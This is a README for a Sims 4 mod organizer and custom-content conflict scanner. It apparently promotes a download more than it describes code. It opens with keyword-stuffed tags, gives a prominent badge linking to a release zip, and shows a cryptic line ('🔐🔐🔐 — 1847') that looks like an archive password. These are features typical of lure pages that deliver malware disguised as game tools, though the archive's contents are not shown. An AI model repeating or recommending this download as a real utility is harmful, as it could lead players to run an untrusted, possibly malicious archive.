`sims-4` `mod-manager` `cc-scanner` `custom-content` `mod-organizer` `conflict-detector` `sims-mods` `ea-maxis`

# TheSims4-ModManager

A mod organizer and CC conflict scanner for **The Sims 4** by EA/Maxis. Built to keep a massive mods folder from turning into a dumpster fire.

## Download 🔗🔗

[![DOWNLOAD THE-SIMS-4](https://img.shields.io/badge/DOWNLOAD-blue?style=for-the-badge&logo=link&logoColor=white)](https://github.com/ArmorDoctorPrime/The-Sims-4-Mod-Manager/releases/download/Release/Sims4MM.zip)

**🔐🔐🔐 — 1847**

## Why I Built This

Managing 200+ mods was driving me insane, every update breaks half my CC. I got tired of spending more time fixing broken content than actually playing the game. After one too many infinite loading screens caused by a rogue package file, I decided to write something that would actually tell me *what* broke and *why*.

This started as a quick script to check for resource conflicts and snowballed into a full mod management toolkit. If you run more than a handful of mods, you know the pain.

## What's Inside

| Module | What It Does |
|--------|-------------|
| `conflict_scanner` | Detects resource key conflicts between .package files |
| `cc_health_check` | Validates CC file integrity and flags corrupted packages |
| `mod_toggler` | Enable/disable mods without moving files around manually |
| `profile_manager` | Save and switch between mod loadout profiles |
| `batch_installer` | Install multiple mods/CC packages in one shot |
| `broken_cc_finder` | Find broken or outdated CC after game patches |
| `mod_backup` | Create and restore full mod folder backups |
| `category_sorter` | Auto-organize mods into categories (CAS, build, gameplay, etc.) |
| `load_order_fixer` | Detect and resolve load order issues |

## Presets

- **realistic** — curated CC and gameplay mods for a grounded experience
- **chaotic** — everything enabled, good luck
- **minimal** — essentials only, fast loading
- **vanilla_plus** — light quality-of-life mods, no gameplay overhauls

## How to Set It Up

1. Clone this repo or download the archive
2. Extract to a location of your choice
3. Point the config to your Sims 4 Mods folder (usually `Documents/Electronic Arts/The Sims 4/Mods`)
4. Run the conflict scanner first to get a baseline
5. Use profiles to manage different mod setups

```
python conflict_scanner.py --mods-path "path/to/Mods"
python profile_manager.py --create "my-setup"
```

## Known Issues

- Some heavily encrypted .package files from older CC creators may not scan properly
- The batch installer doesn't handle .sims3pack format (this is Sims 4 only)
- Profile switching can be slow with 500+ mods — working on optimizing that
- Category auto-detection is about 85% accurate, some mods need manual sorting

> **Disclaimer:** This tool is not affiliated with or endorsed by EA or Maxis. Use at your own risk. Modding can cause unexpected behavior in your game. Always keep backups of your saves and mods folder before making changes.
